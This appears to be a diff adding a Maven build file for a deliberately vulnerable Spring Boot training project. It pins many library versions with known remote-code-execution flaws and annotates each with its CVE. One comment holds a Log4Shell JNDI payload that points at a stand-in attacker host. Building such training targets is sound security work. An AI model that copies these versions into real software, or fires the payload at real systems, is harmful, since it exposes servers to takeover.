@@ -1,0 +1,217 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.death</groupId>
+    <artifactId>cocktail</artifactId>
+    <version>1.0.0</version>
+    <packaging>jar</packaging>
+
+    <name>Death Cocktail Backend</name>
+    <description>
+        ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
+        This project contains intentionally vulnerable dependencies for security training.
+    </description>
+
+    <parent>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-parent</artifactId>
+        <!-- CVE-2022-22965: Spring4Shell RCE (CVSS 9.8) -->
+        <version>2.5.12</version>
+    </parent>
+
+    <properties>
+        <java.version>11</java.version>
+        <!-- Using vulnerable versions intentionally -->
+        <log4j2.version>2.14.1</log4j2.version>
+    </properties>
+
+    <dependencies>
+        <!-- Spring Boot Starter Web -->
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-web</artifactId>
+        </dependency>
+
+        <!-- ============================================ -->
+        <!-- CVSS 10.0 VULNERABILITIES                   -->
+        <!-- ============================================ -->
+
+        <!-- CVE-2021-44228: Log4Shell (CVSS 10.0) -->
+        <!-- Remote Code Execution via JNDI injection -->
+        <!-- Payload: ${jndi:ldap://attacker.com/exploit} -->
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>2.14.1</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>2.14.1</version>
+        </dependency>
+
+        <!-- CVE-2017-5638: Apache Struts RCE (CVSS 10.0) -->
+        <!-- Exploited in Equifax breach (143M records) -->
+        <dependency>
+            <groupId>org.apache.struts</groupId>
+            <artifactId>struts2-core</artifactId>
+            <version>2.3.31</version>
+        </dependency>
+
+        <!-- ============================================ -->
+        <!-- CVSS 9.8 VULNERABILITIES                    -->
+        <!-- ============================================ -->
+
+        <!-- CVE-2019-17571: Log4j 1.x Deserialization RCE (CVSS 9.8) -->
+        <dependency>
+            <groupId>log4j</groupId>
+            <artifactId>log4j</artifactId>
+            <version>1.2.17</version>
+        </dependency>
+
+        <!-- CVE-2020-9484: Tomcat Session Deserialization RCE (CVSS 9.8) -->
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-core</artifactId>
+            <version>9.0.30</version>
+        </dependency>
+
+        <!-- CVE-2021-42013: Apache HTTP Server Path Traversal RCE (CVSS 9.8) -->
+        <!-- Note: Included for demonstration of vulnerable ecosystem -->
+
+        <!-- CVE-2020-1938: Ghostcat - Tomcat AJP (CVSS 9.8) -->
+        <!-- File read and potential RCE via AJP protocol -->
+        <dependency>
+            <groupId>org.apache.tomcat</groupId>
+            <artifactId>tomcat-coyote</artifactId>
+            <version>9.0.30</version>
+        </dependency>
+
+        <!-- CVE-2019-0232: Tomcat CGI Servlet RCE (CVSS 9.8) -->
+
+        <!-- ============================================ -->
+        <!-- CVSS 9.1+ VULNERABILITIES                   -->
+        <!-- ============================================ -->
+
+        <!-- CVE-2022-42889: Apache Commons Text RCE (CVSS 9.8) -->
+        <!-- Text4Shell - Similar to Log4Shell -->
+        <dependency>
+            <groupId>org.apache.commons</groupId>
+            <artifactId>commons-text</artifactId>
+            <version>1.9</version>
+        </dependency>
+
+        <!-- CVE-2015-7501: Commons Collections Deserialization (CVSS 9.8) -->
+        <!-- Used in countless RCE exploits -->
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.2.1</version>
+        </dependency>
+
+        <!-- CVE-2019-12384: Jackson Databind RCE (CVSS 9.8) -->
+        <dependency>
+            <groupId>com.fasterxml.jackson.core</groupId>
+            <artifactId>jackson-databind</artifactId>
+            <version>2.9.8</version>
+        </dependency>
+
+        <!-- CVE-2018-1000861: Jenkins Stapler (CVSS 9.8) -->
+        <!-- Not a direct dependency but demonstrates ecosystem risks -->
+
+        <!-- ============================================ -->
+        <!-- HIGH SEVERITY VULNERABILITIES               -->
+        <!-- ============================================ -->
+
+        <!-- CVE-2021-27568: json-smart DoS/RCE (CVSS 9.1) -->
+        <dependency>
+            <groupId>net.minidev</groupId>
+            <artifactId>json-smart</artifactId>
+            <version>2.3</version>
+        </dependency>
+
+        <!-- CVE-2020-25649: Jackson XXE (CVSS 8.2) -->
+        <dependency>
+            <groupId>com.fasterxml.jackson.dataformat</groupId>
+            <artifactId>jackson-dataformat-xml</artifactId>
+            <version>2.9.10</version>
+        </dependency>
+
+        <!-- CVE-2018-14718: Jackson Deserialization (CVSS 9.8) -->
+        <!-- Polymorphic typing vulnerabilities -->
+
+        <!-- Fastjson: Multiple RCE vulnerabilities -->
+        <!-- CVE-2022-25845 (CVSS 9.8) -->
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.24</version>
+        </dependency>
+
+        <!-- CVE-2016-4437: Apache Shiro RememberMe RCE (CVSS 9.8) -->
+        <dependency>
+            <groupId>org.apache.shiro</groupId>
+            <artifactId>shiro-web</artifactId>
+            <version>1.2.4</version>
+        </dependency>
+
+        <!-- Spring Data JPA for database access -->
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-data-jpa</artifactId>
+        </dependency>
+
+        <!-- PostgreSQL Driver -->
+        <dependency>
+            <groupId>org.postgresql</groupId>
+            <artifactId>postgresql</artifactId>
+            <version>42.2.5</version>
+        </dependency>
+
+        <!-- CVE-2021-22118: Spring Framework RFD (CVSS 7.8) -->
+        <dependency>
+            <groupId>org.springframework</groupId>
+            <artifactId>spring-webmvc</artifactId>
+            <version>5.2.3.RELEASE</version>
+        </dependency>
+
+        <!-- XStream: Multiple XXE/Deserialization RCEs -->
+        <!-- CVE-2021-39144 (CVSS 9.8) -->
+        <dependency>
+            <groupId>com.thoughtworks.xstream</groupId>
+            <artifactId>xstream</artifactId>
+            <version>1.4.17</version>
+        </dependency>
+
+        <!-- SnakeYAML: CVE-2022-1471 RCE (CVSS 9.8) -->
+        <dependency>
+            <groupId>org.yaml</groupId>
+            <artifactId>snakeyaml</artifactId>
+            <version>1.30</version>
+        </dependency>
+    </dependencies>
+
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>org.springframework.boot</groupId>
+                <artifactId>spring-boot-maven-plugin</artifactId>
+            </plugin>
+        </plugins>
+    </build>
+
+    <!--
+    =============================================================
+    VULNERABILITY SUMMARY:
+    =============================================================
+    CVSS 10.0: Log4Shell (CVE-2021-44228), Struts (CVE-2017-5638)
+    CVSS 9.8:  Spring4Shell, Ghostcat, Text4Shell, Commons Collections,
+               Jackson RCE, Fastjson RCE, Shiro RCE, XStream RCE,
+               SnakeYAML RCE
+    CVSS 9.1:  json-smart
+
+    Total Critical Vulnerabilities: 15+
+    =============================================================
+    -->
+</project>
